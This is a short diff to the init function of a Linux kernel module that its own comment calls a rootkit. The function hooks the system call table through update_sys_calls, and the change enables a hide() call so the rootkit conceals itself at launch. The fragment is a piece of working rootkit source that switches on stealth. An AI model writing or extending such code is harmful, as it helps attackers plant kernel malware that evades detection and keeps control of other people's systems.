@@ -24,7 +24,7 @@ static int __init lkm_example_init(void) {
     update_sys_calls(sys_call_table);
 
     //TODO uncomment to hide the rootkit on launch
-    //hide();
+    hide();
     return 0;
 }
 
